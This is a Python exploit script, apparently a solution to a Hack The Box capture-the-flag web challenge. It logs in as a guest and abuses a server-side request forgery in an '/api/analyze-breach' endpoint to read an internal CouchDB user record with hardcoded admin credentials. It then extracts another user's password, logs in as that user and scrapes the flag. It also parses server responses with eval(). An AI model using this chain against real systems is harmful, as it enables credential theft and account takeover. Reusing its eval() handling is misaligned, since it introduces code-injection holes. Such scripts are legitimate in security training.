import requests
import re

BASE_URL = "http://46.101.233.189:32664"
COUCHDB_ADMIN_CREDS = "admin:waxcircle2025"

def get_auth_token(username, password):
    login_url = f"{BASE_URL}/login"
    data = {
        "username": username,
        "password": password
    }
    response = requests.post(login_url, data=data, allow_redirects=False)
    if response.status_code == 302 and 'auth_token' in response.cookies:
        return response.cookies['auth_token']
    return None

def perform_ssrf(auth_token, data_source_url):
    analyze_breach_url = f"{BASE_URL}/api/analyze-breach"
    headers = {
        "Cookie": f"auth_token={auth_token}",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = {
        "data_source": data_source_url
    }
    response = requests.post(analyze_breach_url, headers=headers, data=data)
    if response.status_code == 200:
        return response.json()
    return None

def get_dashboard(auth_token):
    dashboard_url = f"{BASE_URL}/dashboard"
    headers = {
        "Cookie": f"auth_token={auth_token}"
    }
    response = requests.get(dashboard_url, headers=headers)
    if response.status_code == 200:
        return response.text
    return None

def main():
    print("[*] Logging in as guest user...")
    guest_auth_token = get_auth_token("guest", "guest123")
    if not guest_auth_token:
        print("[-] Failed to log in as guest.")
        return

    print("[+] Successfully logged in as guest. Auth token obtained.")

    print("[*] Performing SSRF to retrieve elin_croft's user document...")
    elin_croft_doc_url = f"http://{COUCHDB_ADMIN_CREDS}@127.0.0.1:5984/users/user_elin_croft"
    ssrf_response = perform_ssrf(guest_auth_token, elin_croft_doc_url)

    if not ssrf_response or ssrf_response.get("status") != "success":
        print("[-] Failed to retrieve elin_croft's user document via SSRF.")
        return

    user_data_str = ssrf_response["data"]
    # The data is a JSON string, so we need to parse it
    user_data = eval(user_data_str) # Using eval for simplicity, but json.loads is safer for untrusted input

    elin_croft_username = user_data.get("username")
    elin_croft_password = user_data.get("password")

    if not elin_croft_username or not elin_croft_password:
        print("[-] Failed to extract elin_croft's credentials.")
        return

    print(f"[+] Extracted elin_croft credentials: Username={elin_croft_username}, Password={elin_croft_password}")

    print(f"[*] Logging in as {elin_croft_username}...")
    elin_croft_auth_token = get_auth_token(elin_croft_username, elin_croft_password)
    if not elin_croft_auth_token:
        print(f"[-] Failed to log in as {elin_croft_username}.")
        return

    print(f"[+] Successfully logged in as {elin_croft_username}. Auth token obtained.")

    print("[*] Retrieving dashboard to find the flag...")
    dashboard_html = get_dashboard(elin_croft_auth_token)

    if not dashboard_html:
        print("[-] Failed to retrieve dashboard.")
        return

    flag_pattern = re.compile(r"HTB\{[a-zA-Z0-9_]+\}")
    match = flag_pattern.search(dashboard_html)

    if match:
        flag = match.group(0)
        print(f"[+] Flag found: {flag}")
        with open("flag.txt", "w") as f:
            f.write(flag)
        print("[+] Flag saved to flag.txt")
    else:
        print("[-] Flag not found on the dashboard.")

if __name__ == "__main__":
    main()
